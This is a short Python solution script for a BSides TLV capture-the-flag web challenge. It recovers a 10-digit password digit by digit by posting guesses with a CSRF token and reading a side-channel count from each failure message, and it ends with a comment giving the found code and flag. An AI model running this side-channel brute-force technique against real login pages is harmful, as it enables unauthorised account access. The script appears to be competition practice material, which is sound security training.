import requests
from lxml import html


def test_code():
    global s
    global csrf_token
    global times
    global code
    code_s = ''.join(str(x) for x in code)
    r = s.post(url, data={'password': code_s, 'csrf_token': csrf_token})
    tree = html.fromstring(r.content)
    message = tree.xpath("/html/body/div[@class='page']/div[@class='message']/text()")
    if message:
        if "failed" in message[0]:
            for x in message[0].split():
                if x.isdigit():
                    times[d] = int(x)
    else:
        print(code_s)
        message = tree.xpath("/html/body/div[@class='page']/div[@class='lesson']/p/b/text()")
        print(message[0])
        exit(0)


s = requests.Session()
url = 'http://two.challenges.bsidestlv.com:5050/'
page = s.get(url)
csrf_token = html.fromstring(page.content).forms[0].fields['csrf_token']

code = [0] * 10
for i in range(0, 10):
    times = [0] * 10
    for d in range(0, 10):
        code[i] = d
        test_code()
    max_value = max(times)
    code[i] = times.index(max_value)
    print(code)

# 8105237467 -> BSidesTLV{7456urtyifkygvjhb}
